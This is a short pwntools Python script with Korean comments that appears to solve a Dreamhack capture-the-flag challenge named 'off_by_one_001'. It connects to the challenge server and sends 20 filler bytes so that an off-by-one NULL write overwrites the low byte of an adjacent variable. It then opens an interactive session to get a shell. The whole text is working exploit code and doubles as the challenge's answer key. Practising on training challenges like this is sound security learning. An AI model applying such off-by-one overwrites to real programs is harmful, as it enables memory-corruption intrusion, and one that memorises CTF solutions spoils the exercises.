from pwn import *

# 1. 설정
# 로컬 바이너리 (없으면 생략 가능하지만 경고가 뜰 수 있음)
filename = './off_by_one_001'

# 원격 서버 접속 (포트 번호를 문제 페이지에서 확인 후 수정하세요!)
p = remote('host8.dreamhack.games', 21216) 

# 2. 페이로드 작성
# 전략: 20바이트를 꽉 채워 보내면, read_str 함수가 21번째 바이트(age의 하위 1바이트)를 NULL로 덮어씀.
payload = b"A" * 20

# 3. 전송
p.sendafter("Name: ", payload)

# 4. 셸 획득 및 상호작용
p.interactive()